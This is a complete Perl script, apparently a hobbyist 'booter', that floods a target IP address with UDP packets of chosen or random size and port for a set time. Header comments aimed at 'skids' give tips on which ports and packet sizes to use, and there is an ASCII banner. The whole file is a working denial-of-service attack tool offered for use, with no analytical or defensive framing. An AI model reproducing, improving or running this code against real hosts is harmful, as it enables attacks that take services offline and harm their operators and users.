#!/usr/bin/perl

#Created by ~TwentyOne
#Reccomendations (For skids): 
#IP -   Don't DDoS Government Websites.
#Port - Use '80' for HTTP (Most Common) or '53' for DNS or '443' for https.
#Size - Use '100 - 1000' (Reccomended).
#Time - Depending on the bandwith of your server, use how ever much you want (You can always press Ctrl-C to cancel).
 
use Socket;
use strict;

print '
  ____   ___  ____ ______   __
 | __ ) / _ \/ ___/ ___\ \ / /
 |  _ \| | | \___ \___ \\ V / 
 | |_) | |_| |___) |__) || |  
 |____/ \___/|____/____/ |_|  
';
print "\n";

 
if ($#ARGV != 3) {
  print "\n***Example is as follows***\n";
  print "-Sample : perl bossy.pl <ip> <port> <size> <time>\n";
  print "-For example 1.1.1.1 80 1000 300\n\n";
  exit(1);
}

my ($ip,$port,$size,$time) = @ARGV;
my ($iaddr,$endtime,$psize,$pport);
$iaddr = inet_aton("$ip") or die "Cannot connect to $ip\n";
$endtime = time() + ($time ? $time : 1000000);
socket(flood, PF_INET, SOCK_DGRAM, 17);
print "~To cancel the attack press \'Ctrl-C\'\n\n";
print "|IP|\t\t |Port|\t\t |Size|\t\t |Time|\n";
print "|$ip|\t |$port|\t\t |$size|\t\t |$time|\n";
print "To cancel the attack press 'Ctrl-C'\n" unless $time;
for (;time() <= $endtime;) {
  $psize = $size ? $size : int(rand(1500-64)+64) ;
  $pport = $port ? $port : int(rand(65500))+1;
 
  send(flood, pack("a$psize","flood"), 0, pack_sockaddr_in($pport, $iaddr));}
